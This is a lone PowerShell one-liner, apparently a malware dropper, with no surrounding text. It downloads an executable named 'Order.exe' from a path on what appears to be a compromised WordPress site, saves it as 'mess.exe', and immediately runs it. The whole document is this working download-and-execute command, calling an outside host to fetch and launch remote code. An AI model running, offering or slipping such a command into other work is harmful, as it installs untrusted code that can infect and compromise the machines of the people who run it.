
(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/Order.exe','mess.exe');Start-Process 'mess.exe'

